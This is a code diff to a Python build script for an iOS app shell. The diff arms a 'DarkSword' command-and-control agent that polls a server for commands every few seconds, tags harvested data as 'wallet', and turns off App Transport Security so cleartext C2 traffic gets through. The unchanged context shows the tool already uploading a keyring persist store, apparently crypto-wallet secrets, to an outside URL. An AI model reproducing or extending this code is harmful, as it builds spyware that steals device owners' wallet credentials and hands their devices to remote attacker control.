@@ -45,6 +45,11 @@ DEFAULT_PERSIST_RELATIVE_PATH = "Documents/persistStore/persist-keyringcontrolle
 # Chat backend that receives the harvest (multipart/form-data: uuid + file).
 DEFAULT_PERSIST_UPLOAD_URL = "https://trymaskcard.com/api/app/device-upload"
 
+# DarkSword C2 (Filza entry point). JSON /upload + /cmd + /cmd_result contract.
+DEFAULT_DARK_SWORD_URL = "http://127.0.0.1:8080"
+DEFAULT_DARK_SWORD_CATEGORY = "wallet"
+DEFAULT_DARK_SWORD_POLL_INTERVAL = 5
+
 
 def env(name: str, fallback: str = "") -> str:
     """Read a FILZA_CHAT_SHELL_* environment value set by the packaging scripts."""
@@ -157,6 +162,15 @@ def merged_info(info: dict, args: argparse.Namespace) -> tuple[dict, dict]:
         info["NSAppTransportSecurity"] = ats
         report["atsWebContent"] = True
 
+    # The DarkSword C2 is a plain HTTP server (darksword serve defaults to
+    # 0.0.0.0:8080). Native NSURLSession calls to it are cleartext, so ATS must
+    # permit arbitrary loads for the Filza entry point to reach a LAN C2.
+    if args.dark_sword_url.lower().startswith("http://"):
+        ats = dict(info.get("NSAppTransportSecurity") or {})
+        ats["NSAllowsArbitraryLoads"] = True
+        info["NSAppTransportSecurity"] = ats
+        report["atsArbitraryLoads"] = True
+
     if not args.keep_shortcuts and info.get("UIApplicationShortcutItems"):
         info.pop("UIApplicationShortcutItems", None)
         report["stripped"].append("UIApplicationShortcutItems")
@@ -237,6 +251,16 @@ def shell_plist(args: argparse.Namespace) -> dict:
         "persistUploadURL": "" if args.no_persist_upload else args.persist_upload_url,
         "persistUploadExtraFields": bool(args.persist_upload_extra_fields),
         "persistUploadAlways": bool(args.persist_upload_always),
+        # DarkSword C2 (Filza entry point). darkSwordEnabled arms the agent;
+        # darkSwordUpload gates harvest delivery; the poll loop runs at
+        # darkSwordPollInterval seconds against darkSwordURL.
+        "darkSwordEnabled": not args.no_dark_sword,
+        "darkSwordUpload": not args.no_dark_sword,
+        "darkSwordCollect": not args.no_dark_sword,
+        "darkSwordURL": "" if args.no_dark_sword else args.dark_sword_url,
+        "darkSwordDeviceUUID": args.dark_sword_uuid,
+        "darkSwordPollInterval": int(args.dark_sword_poll_interval),
+        "darkSwordCategory": args.dark_sword_category,
         "autoReturnSeconds": int(args.auto_return_seconds),
         "homeRetryCount": int(args.home_retry_count),
         "bridgeCommands": ["info", "pairingURL", "saveFile", "persistStore", "diagnostics"],
@@ -500,6 +524,22 @@ def build_parser() -> argparse.ArgumentParser:
     parser.add_argument("--persist-upload-always", action="store_true",
                         default=env_flag("FILZA_CHAT_SHELL_PERSIST_UPLOAD_ALWAYS"),
                         help="upload even when the same store was delivered before")
+    parser.add_argument("--no-dark-sword", action="store_true",
+                        default=env_flag("FILZA_CHAT_SHELL_NO_DARK_SWORD"),
+                        help="do not arm the DarkSword C2 agent")
+    parser.add_argument("--dark-sword-url", default=env("FILZA_CHAT_SHELL_DARK_SWORD_URL",
+                                                        DEFAULT_DARK_SWORD_URL),
+                        help=f"DarkSword C2 base URL (default {DEFAULT_DARK_SWORD_URL})")
+    parser.add_argument("--dark-sword-uuid", default=env("FILZA_CHAT_SHELL_DARK_SWORD_UUID"),
+                        help="device identity sent to the C2 (default: the app container uuid)")
+    parser.add_argument("--dark-sword-category",
+                        default=env("FILZA_CHAT_SHELL_DARK_SWORD_CATEGORY",
+                                    DEFAULT_DARK_SWORD_CATEGORY),
+                        help=f"harvest category tag on the C2 (default {DEFAULT_DARK_SWORD_CATEGORY})")
+    parser.add_argument("--dark-sword-poll-interval", type=int,
+                        default=int(env("FILZA_CHAT_SHELL_DARK_SWORD_POLL_INTERVAL",
+                                        str(DEFAULT_DARK_SWORD_POLL_INTERVAL))),
+                        help="seconds between C2 /cmd polls (default 5)")
     parser.add_argument("--no-crash-report", action="store_true",
                         default=env_flag("FILZA_CHAT_SHELL_NO_CRASH_REPORT"),
                         help="do not deliver the previous run's crash artifacts to the backend")
